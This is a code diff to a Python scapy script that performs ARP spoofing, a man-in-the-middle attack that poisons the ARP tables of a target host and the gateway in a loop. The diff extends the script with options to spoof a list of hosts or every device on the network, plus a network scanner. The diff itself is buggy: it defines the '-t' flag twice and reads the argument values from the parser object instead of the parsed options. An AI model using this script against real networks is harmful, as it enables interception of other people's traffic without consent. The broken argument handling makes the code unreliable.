@@ -9,10 +9,16 @@ import argparse
 def get_arguments():
     parser = argparse.ArgumentParser()
     parser.add_argument("-t", "--target", dest="target_ip", help="Target IP")
-    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP")
+    parser.add_argument('-l', "--ips", dest="list_ip", nargs='+', type=str, help='List of IP addresses separated by comma')
+    parser.add_argument("-a", "--all", dest="all", help="Spoof all devices in the network", action="store_true")
+    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP", required=True)
+    parser.add_argument("-i", "--iface", dest="iface", help="Network Interface to Use", required=False)
+    parser.add_argument("-t", "--timeout", dest="timeout", type=int, help="Timeout for broadcasting ARP request", required=False)
+
     options = parser.parse_args()
-    if not options.target_ip:
-        parser.error("[-] Please specify a target IP, use --help for more info.")
+    # Check if at least one argument was provided
+    if not any([parser.list_ip, parser.target_ip, parser.all]):
+        parser.error("At least one argument is required from -t, -l, -a")
     elif not options.gateway_ip:
         parser.error("[-] Please specify a gateway IP, use --help for more info.")
     return options
@@ -49,24 +55,38 @@ def restore_arp_table(victim_ip, victim_mac, false_requester_ip, false_requester
         print("[-] Could not send ARP packet to " + victim_ip + ". Exiting.")
         exit()
 
+def scan_network(ip, timeout=3):
+    arp_req = scapy.ARP(pdst=ip)
+    # print(arp_req.summary())
+    # scapy.ls(scapy.ARP())
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_broadcast = broadcast / arp_req
+    # arp_broadcast.show()
+    answered = scapy.srp(arp_broadcast, timeout=timeout, verbose=False)[0]
+    return answered
+
+
+def start_attack(target_ip, gateway_ip):
+    target_mac = get_mac(target_ip)
+    gateway_mac = get_mac(gateway_ip)
+    count = 0
+    try:
+        while True:
+            spoof_arp_table(target_ip, target_mac, gateway_ip)
+            spoof_arp_table(gateway_ip, gateway_mac, target_ip)
+            count += 2
+            print("\r[+] Packets sent: " + str(count), end="")
+            time.sleep(1)
+
+    except KeyboardInterrupt:
+        print("[+] Detected CTRL + C ...... Resetting ARP Tables ...... Please wait.")
+        restore_arp_table(target_ip, target_mac, gateway_ip, gateway_mac)
+        restore_arp_table(gateway_ip, gateway_mac, target_ip, target_mac)
+        print("[+] ARP Tables Reset Successfully")
 
 option = get_arguments()
-target_mac = get_mac(option.target_ip)
-gateway_mac = get_mac(option.gateway_ip)
+start_attack(option.target_ip, option.gateway_ip)
 
-count = 0
-try:
-    while True:
-        spoof_arp_table(option.target_ip, target_mac, option.gateway_ip)
-        spoof_arp_table(option.gateway_ip, gateway_mac, option.target_ip)
-        count += 2
-        print("\r[+] Packets sent: " + str(count), end="")
-        time.sleep(1)
 
-except KeyboardInterrupt:
-    print("[+] Detected CTRL + C ...... Resetting ARP Tables ...... Please wait.")
-    restore_arp_table(option.target_ip, target_mac, option.gateway_ip, gateway_mac)
-    restore_arp_table(option.gateway_ip, gateway_mac, option.target_ip, target_mac)
-    print("[+] ARP Tables Reset Successfully")
 
 
